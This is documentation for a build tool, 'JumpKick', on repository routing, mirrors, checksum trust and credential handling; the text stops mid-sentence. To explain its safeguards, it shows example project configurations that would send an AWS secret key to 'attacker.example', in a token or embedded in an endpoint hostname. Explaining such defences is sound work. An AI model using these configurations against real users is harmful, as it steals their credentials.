# Repositories and auth

```bash
jk auth login                  # GitHub / GitLab / Gitea / Bitbucket
jk repo login | logout | search | refresh
```

Credentials: env, `jk repo login`, or Maven `settings.xml` — see [Credentials](#credentials) for
the order and for why a credential only travels to the origin its name is bound to. Prefer
`${VAR}` references in your own `~/.jk/config.toml` over secrets in TOML. Corporate mirrors, forge
package registries, S3/MinIO, and GCS are supported. After lock, a build reads the repository's artifacts where they live: Maven Central, and every
repository an active profile of your `~/.m2/settings.xml` declares, keep their artifacts in the
Maven local repository (`~/.m2/repository`), once, shared with Maven; every other origin keeps a
tree under `JK_STORE_DIR/repos/` (see below). JumpKick's `.jk` memos for the former live in the store,
never in `~/.m2`. A file already in the local repository is used where it is once it verifies,
not copied and not downloaded. Set `[m2] integration = false` to keep every origin's artifacts in
its own store tree and leave the Maven local repository alone. `jk install` writes the Maven local repo
by default; `[install] destination = "jk"` keeps a project's artifacts in `repos/jk-local` instead
([Install](packaging.md#jk-install-project)). First-party workers always live in `repos/jk-local`
(`jk-local` is reserved; `[repositories.local]` is a normal user remote name).

## Store layout: one tree per origin

The name you give a repository is yours alone — a label. The store keys each repository's tree
by **where its bytes come from**: `repos/<origin-id>/`, where the id is the origin's host followed
by a digest of its canonical URL (`repos/nexus.acme.com-3f9a1c2b4d5e/`), and the three public
origins JumpKick ships with keep their reserved words (`repos/central`, `repos/google`,
`repos/jumpkick`). So two projects that both call a repository `private` but point it at
different servers never share a cache — a POM or jar fetched for one origin is never served as
the other's, and a poisoned mirror reaches only the projects that actually resolve from it —
while one origin declared under two names is cached once. Each tree records the origin and the
first name it was filled under in `.origin`; `jk storage usage` and `jk doctor` print
`repo: <name> → <origin>` for every tree.

A `repos/<name>` tree from before this rule carries no origin anyone can vouch for, so nothing
reads it; `jk storage usage` flags it and `jk storage clean` removes it. The next resolve
re-fetches into the identity-keyed tree. The cost of that upgrade is bounded: the reserved trees
(`central`, `google`, `jumpkick`) and the `jk-local` shelf are kept as they are, and with
`[m2] integration` on (the default) third-party jars already in `~/.m2/repository` are used
where they are rather than downloaded, so what is fetched again is the POMs and jars of the
repositories you named yourself. Lockfile `source`
fields are unchanged (`"<name>+<url>"`): the URL in the row is what the lookup keys on.

## Built-in remotes

When you declare none: **JumpKick official repo → Maven Central → Google Maven**.
Routing is by group:

| Coordinates | Where they resolve |
|-------------|--------------------|
| `cc.jumpkick`, `cc.jumpkick.*`, `build.jumpkick`, `build.jumpkick.*` | **JumpKick only** (never Central) — dependency-confusion safe |
| `androidx.*`, `com.android.*`, `com.google.android.*`, Firebase/ML Kit/Play-related Google Android groups | **Google Maven first**; Central when Google does not serve the coordinate (`com.google.firebase:firebase-admin` lives on Central, the Firebase Android SDK on Google) |
| Everything else | **Central** (JumpKick/Google specialists are not probed for unbound third-party GAs) |

Official product URL: `https://jumpkick.build/repo/` (override `JK_OFFICIAL_REPO_URL`).
Publishing that repo: [contributor maven-repo](../contributors/maven-repo.md).

Google’s routed set applies whenever the Google Android Maven remote is present
(built-in or declared as `google` / `dl.google.com`). A routed group is a precedence rule
between public repositories, not a confinement: Google answers alone when it has the
coordinate, and a miss there is asked of the other remotes. Declared `groups` on Google are
**exclusive** bindings on top of the routed defaults.

### A repository that does not answer

A repository that gives no answer within the request timeout (60 s) is passed over for the rest of
the resolve, as a blocked one is, and JumpKick says so once: the timeout is paid once, not once per
coordinate, and a package only it serves fails naming it. The next resolve asks it again. A GitLab
project package registry asked for Central's artifacts is the usual case. A repository a mirror
stands in for is the exception: the mirror is the only route to it, so its silence stops the
resolve.

### Transfer limits

A download that stops mid-body fails once 60 s pass with no bytes, naming the URL, rather than
hanging the build; a repository artifact is then asked for again, up to three times in all. The
same bound covers JDK, Android SDK and tool downloads. Downloads stream to disk and have no size
limit, but a response JumpKick reads into memory does: 16 MiB for `maven-metadata.xml`, a POM, a
checksum or a JSON API answer, and 64 MiB for anything else. A larger response fails, naming the
URL and the limit, and is not asked for again.

### When Central refuses this host

Maven Central refuses a host two ways, and both are sticky for hours: Sonatype's per-IP quota
answers HTTP 429, and Cloudflare, which fronts Central's edge, blocks a host it judges abusive
with HTTP 403 carrying `Server: cloudflare` (curl from the next machine still gets 200). Either
answer on a Central request opens a four-hour **mirror window**: the refused request is reissued
against Google's Central mirror (`maven-central.storage-download.googleapis.com/maven2`) in the
same call, and every Central-bound request for the rest of the window — `maven-metadata.xml`,
checksums, plugin workers' closures — goes there without asking Central first.

Outside the window, Central vouches and the mirror carries. Release POMs and artifacts are
downloaded from the mirror first, refused or not, since a release file never changes: a mirror
that has not caught up answers 404, and the file is fetched from Central instead.
`maven-metadata.xml`, which says which versions exist, is asked of Central. A file the lock does
not pin yet is verified against the `.sha1` Central publishes for it — one request — so the
mirror never vouches for its own bytes; mirror bytes Central disowns are discarded and downloaded
from Central with a checksum note. A file the lock pins is verified against its sha256 and reads
no checksum at all, so a cold-cache build from a lockfile asks Central for none of its artifacts.
While the window is open the mirror's own checksums stand in for Central's, and the results say
how many files were verified that way (`N files from central verified by the mirror's checksums only`).
A credential configured for Central goes to Central alone: the mirror is always asked anonymously.
The window is a transport fact, not a repository: the lock records `central` at Central's own URL
and is byte-identical to one written directly. The results say what happened, once per lock,
under **Lock notes**:

```
Maven Central is blocking this host (Cloudflare); using the mirror for 4 h
Maven Central is rate-limiting this host (HTTP 429); using the mirror for 4 h
```

The window lives in `~/.jk/cache/central-rate-limited.stamp`, whose age is the clock, so it
survives `jk engine stop`. Delete the file to ask Central again now; `touch` it to open the
window by hand. `JK_CENTRAL_MIRROR=off` keeps asking Central whatever it answers: a Cloudflare
block then fails the request as `Maven Central is blocking this host (Cloudflare): HTTP 403
fetching …`, naming the switch that keeps the mirror off, and is not retried. A 403 without
Cloudflare's headers is a permission answer and is reported as one.

A plugin whose own resolver fetches outside the lock — the Quarkus augment reads its build-time
deployment closure through Quarkus's embedded Maven resolver — is handed this module's remotes as
JumpKick routes them: the `[repositories]` set over the built-in remotes, in resolve order, a mirror
(`config.toml` or `settings.xml`) standing in for the repository it mirrors, and Central at the mirror while
the window is open, each with the credential JumpKick would send. The fork asks those and nothing else;
Maven's own defaults and `~/.m2/settings.xml`'s repositories are never consulted, so a Central
refusal is answered by the window here rather than by a failed package step.

## A corporate repository: mirror or source

Artifactory or Nexus in front of everything, and Artifactory holding your own artifacts, are two
different statements, spelled two ways:

| You mean | Spelling | What happens |
|---|---|---|
| "My repository intercepts everything" | `[repositories.corp]` with `url` and `mirror-of = ["*"]`, in `~/.jk/config.toml` only | A transport rewrite. Every request for a matched repository opens `corp`'s URL instead; the lock records the mirrored repository (`central` at Central's URL). A matched repository is **never** asked at its own URL. |
| "My repository has our internal stuff" | `[repositories.corp]` with `url` and `groups = ["com.acme", "com.acme.*"]` | A real source, recorded in the lock. Bound groups are asked of their claimants alone ([Exclusive groups](#exclusive-groups-your-internals)); everything else goes corp → central → google. |

```toml
# ~/.jk/config.toml
[repositories.corp]
url            = "https://artifactory.acme.com/maven-virtual/"
mirror-of      = ["*", "!jumpkick"]
token          = "${JK_REPO_CORP_TOKEN}"
# allow-insecure = true   # accepted on a mirror whose URL is plaintext http
```

`mirror-of` lists repository ids in Maven's `mirrorOf` grammar: `*` every repository, `external:*`
every one not on this machine, `external:http:*` every plaintext one not on this machine, a bare id
that repository, `!id` every match but that one. It matches repositories, not packages — routing a
namespace is `groups` on a real repository, and a mirror takes no `groups`. A mirror table carries
only `url`, `mirror-of`, `token` / `username` / `password` and `allow-insecure`; any other key, or
a plaintext network URL without `allow-insecure`, fails the resolve naming the table.

- **A mirror is not a repository.** It is in no repository group, no lock and no `repos/` tree of
  its own, so a project's `jk-lock.toml` is byte-identical with and without it, and the Central →
  Google split never fires behind it.
- **Only `~/.jk/config.toml` declares one.** A mirror describes this machine's network, and a
  cloned project must not be able to redirect your whole resolve: `mirror-of` in a `jk.toml` is a
  parse error.
- **Lookup order:** the `config.toml` mirrors in file order, then `settings.xml`'s `<mirror>`
  entries in file order; the first that matches a repository wins.
- **A mirror never goes direct.** A mirror nothing answers at, or one that answers 401 or 403, is
  the failure, naming the mirror and the repository it stands in for — `optional` on the
  repository does not pass it over. The same holds for a `settings.xml` mirror.
- **Credentials** come from the chain in [Credentials](#credentials), keyed by the mirror's id;
  its `config.toml` table binds the id to its URL, so `${VAR}` there reads your shell and `jk repo
  login corp` binds to the mirror's URL.

`jk lock` notes each mirrored repository and `jk doctor` lists every mirror, from either file,
with the built-in remotes it answers for. A plugin's own resolver (the Quarkus augment) is handed
each repository at its mirror's URL with the mirror's credential. `[mirrors]` in `config.toml` is
a different table: it points the *tool downloads* (Node, Kotlin, Gradle, Maven, JDKs) elsewhere —
see [Config § Tool mirrors](config.md#tool-mirrors).

### Offline

`--offline` (or `offline = true`, `JK_OFFLINE`) means no network, not no repositories. A
repository or mirror whose URL is `file:` is a directory on this disk and is read offline exactly
as it is online: an air-gapped mirror (`mirror-of = ["*"]` at `file:///srv/maven/`) answers an
offline `jk lock` or `jk sync`, POMs, artifacts and version lists alike, and what it serves lands
in the mirrored repository's store as it would online. A repository or mirror reached over
`http`, `https`, `s3` or `gs` is asked nothing offline; what the store already holds from it
answers instead, and a coordinate it never served is not found. Offline, a `file:` repository's
version list is its own and what the store holds from it, together.

`jk add` (and MCP `deps`) offline read the same `file:` repositories: a coordinate without a
version is pinned to the newest stable release they list, and an exact version is checked against
them when every repository the coordinate is asked of is `file:`. A remote repository's version
list is not guessed from the store: with no `file:` repository listing the coordinate, an offline
`jk add group:artifact` is refused and asks for the version, and an exact version is written
unchecked for the lock to report.

## Exclusive groups (your internals)

When you declare an **internal** repository next to a public one, bind *your* Maven
namespaces so those coordinates are **never** fetched from other remotes:

```toml
[repositories.central]
url = "https://repo.maven.apache.org/maven2/"

[repositories.internal]
url = "https://repo.acme.com/maven"
groups = ["com.acme", "com.acme.*"]
```

- **Bound group** → solver only sees versions from claiming repos (a higher version
  planted on Central cannot win).
- **Unbound group** → general remotes in declared order; first repo advertising any
  version answers. Only when every general remote misses does JumpKick fall back to
  non-claiming specialists.
- **Already locked** artifacts keep their lockfile source pin until you re-resolve that
  line (`jk update`).
- Multiple repositories **without** any `groups` → JumpKick **warns once** per lock (still
  resolves). Add exclusive bindings for internal namespaces.

`jk repo refresh <coord>` re-fetches a coordinate (lock-time checksum mismatch is
fail-closed; this is the intentional redo).

## Transport and checksum trust

`jk lock` is where a checksum becomes law, so the bytes it pins must arrive over a channel
nobody can rewrite and match a checksum the repository itself publishes. A repository that
cannot offer one of those is refused until its table says so:

```toml
[repositories.mirror]
url = "http://nexus.corp.example/maven"   # refused without the next line
allow-insecure = true

[repositories.legacy]
url = "https://old.example/maven"          # publishes no .sha256 / .sha1 / .md5 sidecars
allow-unverified = true
```

| Key | Default | What it accepts | The threat it accepts |
|-----|---------|-----------------|-----------------------|
| `allow-insecure` | `false` | A plaintext `http://` URL. Without it the manifest fails to load, naming the repository and URL. Loopback hosts (`localhost`, `127.*`, `::1`) need no opt-in: there is no network path to sit on. A loopback repository is also asked afresh on every lock — the engine keeps no "not found" or version-list memo for a port that may belong to another process next time. | Anyone on the network path can replace the bytes JumpKick pins, and the lockfile then faithfully protects the tampered jar. |
| `blocked` | `false` | Nothing: the repository is known and never asked, as Maven 3.9 blocks a plaintext `http://` repository by default. A plaintext URL parses under it without `allow-insecure`, and `jk import` writes a POM's plaintext `<repository>` this way. A package no other repository serves fails the lock naming the blocked repository, with the plaintext refusal and the two ways out; `blocked` beside `allow-insecure` is refused, since one says never ask and the other says ask. | None: the repository is dialed by nothing. |
| `allow-unverified` | `false` | Pinning an artifact the repository publishes no `.sha256`, `.sha1` or `.md5` for. Without it `jk lock` / `jk update` fail, naming the artifact and repository. An `.md5` alone is accepted without the key, with a note in the lock output naming the artifact and the weaker digest. | The pin is taken from whatever the wire delivered, with nothing from the publisher vouching for it. |

Both are refused on `central`: Maven Central serves https and publishes a checksum for every
artifact, so the opt-in would only ever hide an attack. `file://` repositories are local disk
with no network path, so neither key applies to them. A `file://` repository with no
`maven-metadata.xml` for a module — a Maven local repository, a JumpKick store tree — lists the module's
version directories instead, each one that holds its `<artifact>-<version>.pom`, so `latest`, `^`,
`~` and ranges resolve through it; a `-SNAPSHOT` directory follows the
[release and snapshot policy](#release-and-snapshot-policy) like a catalog's entry.

## Release and snapshot policy

A repository is asked only for the kind of version its policy covers, as a Maven `<repository>`
is:

```toml
[repositories]
nightly = { url = "https://central.sonatype.com/repository/maven-snapshots/", releases = false }
stable  = { url = "https://repo.example/releases", snapshots = false }
```

| Key | Default | Effect |
|-----|---------|--------|
| `releases` | `true` | Release versions are asked of the repository. `false` makes it snapshot-only: it is never read for a release catalog, so it can neither slow a lock nor supply a floating selector. |
| `snapshots` | `true` | `-SNAPSHOT` versions are asked of the repository. `false` makes it releases-only. |

A repository with both off is refused. The built-in remotes — `central`, `google`, `jumpkick` —
serve releases only. A snapshot is a candidate only when a pin or a dependency's POM names one, or
the `snapshot` selector asks for the newest published version: see
[Dependencies](dependencies.md#snapshots).

A repository nothing answers at — the connection refused, the host unknown, the connect timed
out — stops a resolve at once, naming the repository and its URL: a lock computed without a
configured repository is not the lock that was asked for, and asking it again for every
coordinate would only wait out the retry ladder each time. Fix the URL, start the server, or
remove the entry. A repository the lock can do without is passed over instead, as a blocked one
is: asked nothing more, with one warning, and named with the fault it met when a package resolves
nowhere. For such a repository any request that gets no HTTP answer at all — refused, reset,
dropped before a response, timed out — counts, and after one attempt rather than the retry
ladder; so does a 401 or 403, as Maven moves on past a repository that wants credentials it
was not given. Any other status, a 5xx included, is an answer. A repository written by hand
that answers 401 or 403 stops the resolve: its credentials are the user's to fix. That is one declared `optional = true` — `jk import` writes a POM's `<repository>` this
way, as Maven falls through one that answers nothing — one at a loopback address (`localhost`,
`127.*`, `::1`: a developer's local Nexus no other machine runs), and one a dependency's POM
declares:

```toml
[repositories]
vendor = { url = "https://vendor.example/maven/", optional = true }
```

A remote that accepts and then drops a request is that request's failure
alone; the remaining repositories are still asked. Pinned bytes are another matter: a build
whose lock names an unreachable repository still takes the artifact from any repository that
serves the same sha256 — and pays the retry ladder once, not once per artifact: an address that
answered nothing through a whole ladder is remembered for a minute, and every later request to
it, from any repository entry or thread, is refused before it dials and falls through to the
next repository at once. A forced session (`jk lock -F`, `jk sync -F`, `jk build -F`)
forgets that memory on both its legs, so a repository that came back inside the minute is asked
again at once.

When a repository has opted out, the lock summary says so — `Resolved 42 dependencies ·
2 unverified (allowed) · insecure (allowed): mirror` — so the count is visible on every lock
instead of scrolling past as a warning. After the lock, builds enforce the pinned sha256 as
usual.

## Credentials

Sources, in order — the first that yields a credential wins:

1. inline in the `[repositories.<id>]` table: `token`, or `username` + `password`, normally as
   references expanded when the repository is used — see [Secret references](#secret-references)
   and [Who may write a `${VAR}` reference](#who-may-write-a-var-reference)
2. `JK_REPO_<ID>_TOKEN`, or `JK_REPO_<ID>_USERNAME` + `JK_REPO_<ID>_PASSWORD` — `<ID>` is the id
   upper-cased with every non-alphanumeric as `_` (`corp-nexus` → `CORP_NEXUS`). Each also has a
   `_FILE` form (`JK_REPO_<ID>_TOKEN_FILE`, `_USERNAME_FILE`, `_PASSWORD_FILE`) that names a file
   holding the value, the convention Docker and Kubernetes secret mounts follow; see
   [Secret references](#secret-references)
3. `jk repo login <id>` (the secret in the OS keychain, or the owner-only file under
   `~/.jk/creds/repo/` — see [Where a login keeps its secret](#where-a-login-keeps-its-secret))
4. the `<server>` with that `<id>` in `~/.m2/settings.xml` (a `<mirror>` or active-profile
   `<repository>` with that id in the same file binds the name to its URL — see
   [Maven `settings.xml`](#maven-settingsxml-mirrors-proxies-profiles))
5. a `jk auth login` forge token, for forge package registries (matched by host)

Tool distribution mirrors and npm registries use the same chain, keyed by host — see
[Config § Tool mirrors](config.md#tool-mirrors) and [Config § Node network](config.md#node-network).

`jk publish -c` reads the id `central`, bound to `https://central.sonatype.com` — see
[Publish: Maven Central](publish.md#maven-central).

### On CI, in a container, over SSH

A CI server, a build container, an SSH session and an engine started by systemd have no desktop
and no keychain, and that is the normal case. Give JumpKick the secret the way the machine already holds
it:

- **From the CI secret store:** `JK_REPO_<ID>_TOKEN` (or `_USERNAME` + `_PASSWORD`) as an
  environment variable, or `JK_REPO_<ID>_TOKEN_FILE` naming a file the runner writes. Nothing is
  stored, and nothing is left behind when the job ends.
- **From a mounted secret** (Docker, Kubernetes, a systemd credential): `${file:/run/secrets/nexus}`
  in `~/.jk/config.toml`, or the `_FILE` variable. See [Secret references](#secret-references).
- **From a token service** (cloud registries, vaults, short-lived tokens): `${cmd:…}` in
  `~/.jk/config.toml`. See [Credential helpers](#credential-helpers).

```yaml
# GitHub Actions
env:
  JK_REPO_CORP_TOKEN: ${{ secrets.NEXUS_TOKEN }}
```

A GitLab package registry on GitLab CI takes the job token as a password:

```yaml
# .gitlab-ci.yml, for a repository named gitlab
variables:
  JK_REPO_GITLAB_USERNAME: gitlab-ci-token
  JK_REPO_GITLAB_PASSWORD: $CI_JOB_TOKEN
  JK_REPO_GITLAB_HOST: gitlab.com
```

`jk repo login` works headless too: the secret goes in the owner-only record without a word (see
[Where a login keeps its secret](#where-a-login-keeps-its-secret)). JumpKick never prompts for, waits on,
or warns about a keychain on a machine that has none.

### A credential for one project's repository

A `[repositories.<id>]` table in `~/.jk/config.toml` is a repository every project on the machine
asks. To give only the projects that declare `<id>` a credential, mark the table
`credential-only`:

```toml
# ~/.jk/config.toml
[repositories.gitlab]
url = "https://gitlab.com/api/v4/projects/57207691/packages/maven/"
credential-only = true
token = "${env:GITLAB_TOKEN}"
```

A project whose `jk.toml` declares `gitlab` at that URL resolves with this token; every other project
never asks it. `jk import` writes a build's credentials this way. `credential-only` is refused in a
project's `jk.toml`.

### Secret references

A credential value, an object-store key and a `[mirrors]` value can be a reference instead of the
secret itself. JumpKick expands it each time the repository is used:

| Spelling | Value |
|----------|-------|
| `${NAME}` or `${env:NAME}` | the environment variable (`env:` is the explicit spelling) |
| `${file:~/.secrets/nexus-token}` | the whole file, with its trailing newline trimmed |
| `${file:~/.jk/secrets.properties#nexus.password}` | one key of a Java `.properties` file |
| `${cmd:gcloud auth print-access-token}` | what a credential helper prints; see [Credential helpers](#credential-helpers) |

```toml
# ~/.jk/config.toml
[repositories.corp]
url      = "https://nexus.acme.com/repository/maven/"
username = "deployer"
password = "${file:~/.jk/secrets.properties#corp.password}"
```

- `~` expands to your home. A relative path is relative to `~/.jk/`, the directory of the file
  that declares it.
- On Linux and macOS, JumpKick refuses a file that its group or other users can read, and names the
  fix: `chmod 600 <file>`. The check follows symlinks. Windows is not checked.
- A container platform's secret mount is accepted at its default mode. Docker and Compose mount
  secrets in `/run/secrets` as `0444`, and Kubernetes mounts service-account and workload-identity
  tokens in `/var/run/secrets` as `0644`. Under those two directories, JumpKick reads a file that others
  can read, as long as only its owner can write it and that owner is root or you. Only root can
  create those directories, so JumpKick doesn't need to detect a container. Accepting the file allows only
  what the mount already allows: other users on the machine can read it too. A mounted file that
  someone else owns, or that its group or others can write, is still refused.
- Mount a Kubernetes secret volume under `/var/run/secrets`, for example
  `mountPath: /var/run/secrets/nexus`, and it is accepted at its default mode. That includes
  `defaultMode: 0440` with `fsGroup`, which is how a non-root JumpKick reads a root-owned secret. Mounted
  anywhere else (such as `/etc/secrets`), the file must be readable by its owner alone: set
  `defaultMode: 0400`, which only a root JumpKick can read. For a Compose secret with a custom `target`,
  set `mode: 0400`.
- A missing file, a missing key, or an empty value is an error that names
  `repositories.<id>.<key>` and the path. JumpKick never falls back to an anonymous request.
- A repository only `~/.jk/config.toml` declares, whose reference does not resolve (an unset
  variable, a missing file), fails only the resolves that ask it: it sends nothing and refuses each
  request, naming the reference, while every project that never asks it resolves as usual. A
  repository the project declares fails the resolve at once.
- JumpKick re-reads the file whenever its modification time, size or identity changes, so a rotated
  secret takes effect on the next command. You don't need `jk engine stop`.
- JumpKick masks every value it reads in its output, `-o jsonl` and the engine log, the same way it masks
  every other credential.

A `JK_REPO_<ID>_*_FILE` variable follows the same permission rule. Setting both
`JK_REPO_<ID>_TOKEN` and `JK_REPO_<ID>_TOKEN_FILE` is an error. JumpKick reads the `_FILE` variable from
the shell that runs `jk`, never from a project's `.env`, so a cloned project can't choose which of
your files a credential comes from. A relative path is relative to your home directory.

### Credential helpers

Cloud registries and vaults issue tokens that expire within the hour, so no file stays valid. A
`${cmd:…}` reference runs a helper and uses what it prints:

```toml
# ~/.jk/config.toml — Google Artifact Registry
[repositories.gar]
url   = "https://us-maven.pkg.dev/acme/maven/"
token = "${cmd:gcloud auth print-access-token}"

# AWS CodeArtifact: a 12-hour token, reused for 30 minutes
[repositories.codeartifact]
url      = "https://acme-111122223333.d.codeartifact.us-east-1.amazonaws.com/maven/libs/"
username = "aws"
password = "${cmd:aws codeartifact get-authorization-token --domain acme --domain-owner 111122223333 --query authorizationToken --output text #ttl=30m}"
```

- JumpKick splits the command into words the way it splits `[scripts]`, with single and double quotes,
  and runs it without a shell. To use pipes or `$VAR` expansion, write `sh -c '…'` yourself.
- The helper runs with the environment of the shell that ran `jk`, so `PATH`, `gcloud`'s active
  account and `AWS_PROFILE` match your terminal, not the shell that started the engine. Its
  working directory is your home, and its stdin is closed.
- Its stdout, with surrounding whitespace trimmed, is the value. A non-zero exit, empty output, or
  no answer within 10 seconds is an error that names `repositories.<id>.<key>`, the command and
  the end of its stderr.
- The engine reuses a helper's value for 15 minutes. Set a different time with a `#ttl=` suffix
  (`s`, `m` or `h`) at the end of the command. The cache is keyed by the command and your
  environment, and concurrent resolves share one run.
- When the repository answers 401 or 403, JumpKick drops the cached value, runs the helper once more,
  and sends the request once more. A second refusal is the answer.
- A helper runs again at most once per command. If the value it printed on that second run is
  refused too, every other repository and module that uses it fails at once, so an expired SSO login
  doesn't run the helper twice for every module of a lock. The next command runs the helper again.
  The failure names the repository and the refusal, and says why no other value was sent: the
  helper's re-run value was refused too, or the helper failed and what it said.
- A plugin step whose own resolver runs in a separate process (the Quarkus augment's) is handed
  the credential once and cannot ask for it again. JumpKick hands it a value the helper printed during
  this command, running the helper if the cached value came from an earlier one. The value must
  stay valid for as long as that step runs; a token that expires mid-step fails the step with a
  401, and the next command hands it a fresh one.
- JumpKick masks what the helper prints, as it masks every other credential.

`${cmd:…}` works only in `~/.jk/config.toml`. Anywhere else it is a parse error, not a warning:
a project that could name a command would run it on your machine at its first resolve.

### Where a login keeps its secret

On a desktop, `jk repo login` and `jk auth login` put the token or password in the OS keychain
when one answers: the macOS Keychain (`/usr/bin/security`), the Windows Credential Manager
(`CredWriteW` in process, a generic credential `jk:repo/<id>` that `cmdkey /list` shows, holding
the secret in UTF-8; a token over 2,560 bytes is split across `jk:repo/<id>#1` … `#n`, up to 80 KiB,
which are read, checked and removed together), or the
Secret Service on Linux (GNOME Keyring, KWallet, KeePassXC, through libsecret's `secret-tool`). The
record under `~/.jk/creds/repo/<id>` keeps what is not secret: the `<scheme> <origin>` binding, the
username, and a pointer to the keychain item (`secret-service repo/nexus`). A `jk auth login`
record under `~/.jk/creds/forge/<host>` holds only the pointer.

Everywhere else the secret stays in the owner-only record, silently:

- On a CI server (`CI`, `GITHUB_ACTIONS`, `GITLAB_CI`, `JENKINS_URL`, `BUILDKITE`, … is set) or in a
  container (`/.dockerenv`, `/run/.containerenv`, `container` or `KUBERNETES_SERVICE_HOST`), JumpKick asks
  no keychain at all.
- With no keychain on the machine — no D-Bus session bus or no `secret-tool` on Linux, a macOS
  login keychain that is locked with no window server to unlock it (SSH, launchd), a Windows SSH
  key logon, which has no credential set — the record takes the secret without a notice.
- A keychain that is there and refuses (a locked GNOME Keyring collection, a denial) earns one
  notice saying why, except over SSH with no display, where nobody could have unlocked it.

JumpKick never shows or waits on an unlock prompt. Before every keychain call it checks, without
prompting, whether the keychain is locked — on Linux by reading the default collection's `Locked`
property with `busctl` or `gdbus`, on macOS by reading the default keychain's lock status from the
Security framework — and a locked keychain is a refusal on the spot. A check takes
at most a second and a call at most five.

Choose explicitly in `~/.jk/config.toml`, or with `JK_CREDENTIALS_STORE`:

```toml
[credentials]
store = "keychain"   # fail the login when no keychain takes the secret, naming why
# store = "file"     # keep it in the owner-only record and never ask a keychain
```

`store = "keychain"` on a machine with no keychain fails the login at once, and the error names the
headless recipe above.

A login over an existing record moves its secret to wherever the login puts it now, and removes
a keychain item the record no longer points at. A plaintext record still reads; nothing migrates
it except the next login. `jk repo logout <id>` and `jk auth logout` remove the keychain item,
then the record; a keychain that refuses (locked) keeps the record, so the logout can be retried.
`jk doctor` lists every login with where its secret is.

A resident engine keeps the session of whichever shell started it, and the next `jk` may run in
another: the Secret Service is found through the shell's D-Bus variables (none when the engine was
started over SSH or by systemd), a Windows engine started over SSH has no credential set, and a
macOS engine started over SSH sees the login keychain locked while the desktop has it open. So the
`jk` command always reads the keychain items its logins point at and sends the secrets with its
request, the way `JK_REPO_*` variables travel. An item the command could not read (the keychain is
locked or refused, or holds no such item) is sent as the reason, and the engine warns with it
instead of asking the keychain again. Only a build started without a `jk` command — from the
dashboard or an MCP client — reads keychain items from the engine, which reaches a keychain only when
it was started from a desktop session; an engine with no keychain never tries to reach one, and a
login whose secret is in its record serves it as usual.

### A name is not a destination

Sources 2–4 are keyed by the repository *id*, and the project's `jk.toml` chooses which URL that
id points at. Left alone, a cloned project declaring `[repositories.ossrh] url =
"https://attacker.example/m2/"` would receive whatever your machine holds under `ossrh` on its
first resolve. So a name-keyed credential is sent only to an origin (scheme, host, port) that
something the project cannot edit binds the name to:

| Binding | Where it comes from |
|---------|---------------------|
| the URL `jk repo login <id>` recorded | the login itself. Run inside a project it binds to the URL `~/.jk/config.toml` or that project's `jk.toml` declares for the id (printed on login); `--url <url>` binds explicitly; a host-shaped id (`ghcr.io`, `127.0.0.1:5000`) binds to `https://<id>` |
| `[repositories.<id>]` in `~/.jk/config.toml` | your own config; its origin must match the project's |
| `JK_REPO_<ID>_HOST=<host[:port]>` (or a full URL) | your shell or CI variables. A project's `.env` cannot supply it |
| the id *is* the host | container registries and other repositories addressed by host |

A user-config declaration outranks the rest: if it names another origin than the project does, the
credential stays home even when a `JK_REPO_<ID>_HOST` agrees with the project.

When a credential exists but nothing binds it — or something binds it elsewhere — the repository
is accessed anonymously and JumpKick warns once per run, naming the repository, the origin it declares,
the source that was held back and what would send it:

```
jk: warning: ossrh at https://attacker.example: credential from jk repo login not sent; it was
stored for https://s01.oss.sonatype.org; if the repository moved, run jk repo login ossrh -U …
```

CI that exports `JK_REPO_INTERNAL_TOKEN` for a repository the project declares exports
`JK_REPO_INTERNAL_HOST=repo.acme.com` beside it.

### Who may write a `${VAR}` reference

An inline `${VAR}` reads your shell too, and which file wrote it decides whether it may:

| Declared in | `${VAR}` may name | `${file:…}` | `${cmd:…}` |
|-------------|-------------------|-------------|------------|
| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin | allowed | allowed |
| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above | refused like a foreign variable; anywhere outside a repository's credential or object-store keys it is a parse error | a parse error |

A project manifest is anyone's: a cloned one declaring `[repositories.internal] url =
"https://attacker.example/" token = "${AWS_SECRET_ACCESS_KEY}"` would otherwise receive that value in
the `Authorization` header of its first resolve. So a project's reference to any other variable is
refused, the repository is accessed anonymously, and JumpKick warns once per run:

```
jk: warning: internal at https://attacker.example: no credential sent; jk.toml cannot use ${AWS_SECRET_ACCESS_KEY}
  move the reference to ~/.jk/config.toml, set JK_REPO_INTERNAL_TOKEN with JK_REPO_INTERNAL_HOST=attacker.example, or run jk repo login internal -U https://attacker.example/
```

The rule covers every `${VAR}` a `[repositories.<id>]` table writes, not only `token` /
`username` / `password`: an object-store repository's `access-key`, `secret-key` and
`session-token`, and its `region` and `endpoint` too — a region rides the request signature in
clear and an endpoint becomes a host name to resolve, so `endpoint =
"https://${AWS_SECRET_ACCESS_KEY}.attacker.example"` would leak the value exactly as `secret-key`
would. A refused object-store key is left unset (the transport falls back to the ambient AWS chain,
or goes unsigned); the literal keys beside it stay. A `[repositories.<id>]` table in
`~/.jk/config.toml` at the same origin supplies its own object-store keys instead, whatever the
project wrote.

A literal credential written into either file is that file's own secret and is used as written;
committing one to a project is a leak of the project's secret, not of yours.

Every `JK_REPO_*` variable is read from the shell that runs `jk` and sent with the request, so it
reaches a resident engine that another terminal started, for that request only. Exporting a token
in a new terminal is enough; no `jk engine stop` is needed.

## Maven `settings.xml`: mirrors, proxies, profiles

A team already on Maven usually reaches the outside world through `~/.m2/settings.xml`: a
`<mirror>` that sends `central` (or `*`) to Nexus or Artifactory, a `<proxy>` in front of it, and
the internal repositories listed in a profile that `<activeProfiles>` turns on. JumpKick reads the same
file, so `jk build` on an unmodified `pom.xml` and `jk import pom.xml` work on the machine `mvn`
works on, with nothing added to the project:

```xml
<settings>
  <mirrors>
    <mirror>
      <id>nexus</id>
      <mirrorOf>*</mirrorOf>
      <url>https://nexus.acme.com/repository/maven-public/</url>
    </mirror>
  </mirrors>
  <servers>
    <server><id>nexus</id><username>me</username><password>…</password></server>
  </servers>
  <proxies>
    <proxy><id>corp</id><protocol>https</protocol><host>proxy.acme.com</host><port>3128</port>
      <nonProxyHosts>*.acme.com|localhost</nonProxyHosts></proxy>
  </proxies>
  <profiles>
    <profile><id>acme</id><repositories>
      <repository><id>acme-releases</id><url>https://nexus.acme.com/repository/releases/</url></repository>
    </repositories></profile>
  </profiles>
  <activeProfiles><activeProfile>acme</activeProfile></activeProfiles>
</settings>
```

**A mirror is a transport rewrite, not a repository.** The resolver keeps asking `central`, the
lock keeps recording `central+https://repo.maven.apache.org/maven2/`, the store keeps its
